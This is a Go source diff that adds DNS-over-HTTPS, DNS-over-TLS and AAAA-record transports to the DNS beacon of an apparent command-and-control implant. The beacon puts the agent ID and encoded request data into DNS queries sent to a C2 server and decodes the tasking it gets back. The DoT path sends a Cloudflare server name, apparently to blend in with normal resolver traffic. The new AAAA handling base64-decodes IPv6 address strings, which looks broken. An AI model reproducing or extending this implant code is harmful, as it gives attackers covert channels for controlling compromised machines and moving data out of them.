@@ -4,11 +4,15 @@
 package main
 
 import (
+	"bytes"
+	"crypto/tls"
 	"encoding/base32"
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
+	"io"
 	"net"
+	"net/http"
 	"strings"
 	"time"
 )
@@ -16,6 +20,7 @@ import (
 // sendDNSBeacon performs a DNS TXT-based C2 beacon.
 // It builds a TXT query with the agent UUID (and optional base32-encoded JSON request)
 // in the subdomain, sends it to the C2 DNS server, and reads the TXT response.
+// Supports UDP, DNS-over-HTTPS (DoH), and DNS-over-TLS (DoT) based on config.
 func sendDNSBeacon(body []byte) []byte {
 	domain := DNSDomain
 	if domain == "" {
@@ -46,62 +51,131 @@ func sendDNSBeacon(body []byte) []byte {
 		qname = uuidHex + ".dns." + domain
 	}
 
-	// Build DNS TXT query packet
-	pkt := buildDNSTXTQuery(qname)
+	// Determine DNS transport: DoH > DoT > UDP
+	dohURL := DNSDoHURL
+	dotAddr := DNSDoTAddr
 
-	// Send via UDP to DNS server
+	if dohURL != "" {
+		return sendDNSDoH(dohURL, qname)
+	}
+	if dotAddr != "" {
+		return sendDNSDoT(dotAddr, qname)
+	}
+	return sendDNSUDP(dnsServer, qname)
+}
+
+// sendDNSUDP sends a DNS query via plain UDP.
+func sendDNSUDP(dnsServer, qname string) []byte {
+	qtype := uint16(16) // TXT
+	if DNSIPv6 {
+		qtype = 28 // AAAA
+	}
+	pkt := buildDNSQuery(qname, qtype)
+
 	conn, err := net.DialTimeout("udp", dnsServer+":53", 5*time.Second)
 	if err != nil {
 		if Debug {
-			fmt.Printf("[!] DNS beacon dial failed: %v\n", err)
+			fmt.Printf("[!] DNS UDP dial failed: %v\n", err)
 		}
 		return nil
 	}
 	defer conn.Close()
 
 	conn.SetDeadline(time.Now().Add(10 * time.Second))
-
 	if _, err := conn.Write(pkt); err != nil {
-		if Debug {
-			fmt.Printf("[!] DNS beacon write failed: %v\n", err)
-		}
 		return nil
 	}
 
-	// Read response (max 4096 bytes)
 	resp := make([]byte, 4096)
 	n, err := conn.Read(resp)
 	if err != nil {
-		if Debug {
-			fmt.Printf("[!] DNS beacon read failed: %v\n", err)
-		}
 		return nil
 	}
 
-	// Parse TXT response
-	txts := parseDNSTXTResponse(resp[:n])
-	if len(txts) == 0 {
-		if Debug {
-			fmt.Println("[!] DNS beacon: no TXT records in response")
-		}
+	return parseDNSResponse(resp[:n], qtype)
+}
+
+// sendDNSDoH sends a DNS query via DNS-over-HTTPS (RFC 8484).
+func sendDNSDoH(dohURL, qname string) []byte {
+	qtype := uint16(16) // TXT
+	if DNSIPv6 {
+		qtype = 28 // AAAA
+	}
+	pkt := buildDNSQuery(qname, qtype)
+
+	req, err := http.NewRequest("POST", dohURL, bytes.NewReader(pkt))
+	if err != nil {
 		return nil
 	}
+	req.Header.Set("Content-Type", "application/dns-message")
+	req.Header.Set("Accept", "application/dns-message")
 
-	// Concatenate all TXT chunks and base64 decode
-	combined := strings.Join(txts, "")
-	combined = strings.TrimSpace(combined)
-	if combined == "" || combined == " " {
-		return nil
-	}
-
-	data, err := base64.StdEncoding.DecodeString(combined)
+	resp, err := client.Do(req)
 	if err != nil {
 		if Debug {
-			fmt.Printf("[!] DNS beacon base64 decode failed: %v\n", err)
+			fmt.Printf("[!] DNS DoH request failed: %v\n", err)
 		}
 		return nil
 	}
-	return data
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		return nil
+	}
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil
+	}
+
+	return parseDNSResponse(body, qtype)
+}
+
+// sendDNSDoT sends a DNS query via DNS-over-TLS (RFC 7858).
+func sendDNSDoT(dotAddr, qname string) []byte {
+	qtype := uint16(16) // TXT
+	if DNSIPv6 {
+		qtype = 28 // AAAA
+	}
+	pkt := buildDNSQuery(qname, qtype)
+
+	tlsCfg := &tls.Config{
+		ServerName:         "cloudflare-dns.com",
+		InsecureSkipVerify: SkipTLSVerify,
+	}
+	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp", dotAddr, tlsCfg)
+	if err != nil {
+		if Debug {
+			fmt.Printf("[!] DNS DoT dial failed: %v\n", err)
+		}
+		return nil
+	}
+	defer conn.Close()
+
+	conn.SetDeadline(time.Now().Add(10 * time.Second))
+	// DNS over TCP: 2-byte length prefix
+	tcpPkt := make([]byte, 2+len(pkt))
+	binary.BigEndian.PutUint16(tcpPkt[:2], uint16(len(pkt)))
+	copy(tcpPkt[2:], pkt)
+
+	if _, err := conn.Write(tcpPkt); err != nil {
+		return nil
+	}
+
+	// Read response: 2-byte length prefix + response
+	var respLen uint16
+	if err := binary.Read(conn, binary.BigEndian, &respLen); err != nil {
+		return nil
+	}
+	if respLen == 0 || respLen > 4096 {
+		return nil
+	}
+	respBody := make([]byte, respLen)
+	if _, err := io.ReadFull(conn, respBody); err != nil {
+		return nil
+	}
+
+	return parseDNSResponse(respBody, qtype)
 }
 
 // hexEncodedUUID converts UUID with dashes to a hex-only string
@@ -109,8 +183,8 @@ func hexEncodedUUID(uuid string) string {
 	return strings.ReplaceAll(uuid, "-", "")
 }
 
-// buildDNSTXTQuery builds a raw DNS TXT query packet for the given domain name.
-func buildDNSTXTQuery(name string) []byte {
+// buildDNSQuery builds a raw DNS query packet for the given domain name and qtype.
+func buildDNSQuery(name string, qtype uint16) []byte {
 	encoded := encodeDNSName(name)
 
 	// Header (12 bytes)
@@ -130,8 +204,8 @@ func buildDNSTXTQuery(name string) []byte {
 
 	// Question
 	q := encoded
-	// QTYPE: TXT = 16
-	q = append(q, 0, 16)
+	// QTYPE
+	q = append(q, byte(qtype>>8), byte(qtype))
 	// QCLASS: IN = 1
 	q = append(q, 0, 1)
 
@@ -153,20 +227,16 @@ func encodeDNSName(name string) []byte {
 	return buf
 }
 
-// parseDNSTXTResponse parses a DNS response packet and returns TXT record strings.
-func parseDNSTXTResponse(pkt []byte) []string {
+// parseDNSResponse parses a DNS response packet for TXT (16) or AAAA (28) records.
+func parseDNSResponse(pkt []byte, qtype uint16) []byte {
 	if len(pkt) < 12 {
 		return nil
 	}
 
-	// Parse header
-	// qdcount := binary.BigEndian.Uint16(pkt[4:6])
 	ancount := binary.BigEndian.Uint16(pkt[6:8])
-
-	// Skip header (12 bytes) + question section
 	offset := 12
 
-	// Skip question
+	// Skip question section
 	for offset < len(pkt) {
 		if pkt[offset] == 0 {
 			offset++
@@ -178,8 +248,7 @@ func parseDNSTXTResponse(pkt []byte) []string {
 		}
 		offset += int(pkt[offset]) + 1
 	}
-	// Skip QTYPE + QCLASS
-	offset += 4
+	offset += 4 // skip QTYPE + QCLASS
 
 	if offset > len(pkt) {
 		return nil
@@ -187,7 +256,6 @@ func parseDNSTXTResponse(pkt []byte) []string {
 
 	var txts []string
 	for i := 0; i < int(ancount) && offset < len(pkt); i++ {
-		// NAME (could be pointer)
 		if offset+2 > len(pkt) {
 			break
 		}
@@ -197,7 +265,7 @@ func parseDNSTXTResponse(pkt []byte) []string {
 			for offset < len(pkt) && pkt[offset] != 0 {
 				offset += int(pkt[offset]) + 1
 			}
-			offset++ // skip 0 root
+			offset++
 		}
 
 		if offset+10 > len(pkt) {
@@ -205,10 +273,8 @@ func parseDNSTXTResponse(pkt []byte) []string {
 		}
 		rtype := binary.BigEndian.Uint16(pkt[offset : offset+2])
 		offset += 2
-		// CLASS
-		offset += 2
-		// TTL
-		offset += 4
+		offset += 2 // CLASS
+		offset += 4 // TTL
 		rdlength := binary.BigEndian.Uint16(pkt[offset : offset+2])
 		offset += 2
 
@@ -217,7 +283,6 @@ func parseDNSTXTResponse(pkt []byte) []string {
 			if end > len(pkt) {
 				end = len(pkt)
 			}
-			// TXT record: sequence of <length-byte><string>
 			pos := offset
 			for pos < end {
 				if pos >= len(pkt) {
@@ -231,9 +296,31 @@ func parseDNSTXTResponse(pkt []byte) []string {
 				txts = append(txts, string(pkt[pos:pos+txtLen]))
 				pos += txtLen
 			}
+		} else if rtype == 28 { // AAAA (IPv6)
+			if rdlength == 16 && offset+16 <= len(pkt) {
+				ip := net.IP(pkt[offset : offset+16])
+				txts = append(txts, ip.String())
+			}
 		}
 		offset += int(rdlength)
 	}
 
-	return txts
+	if len(txts) == 0 {
+		return nil
+	}
+
+	combined := strings.Join(txts, "")
+	combined = strings.TrimSpace(combined)
+	if combined == "" || combined == " " {
+		return nil
+	}
+
+	data, err := base64.StdEncoding.DecodeString(combined)
+	if err != nil {
+		if Debug {
+			fmt.Printf("[!] DNS base64 decode failed: %v\n", err)
+		}
+		return nil
+	}
+	return data
 }
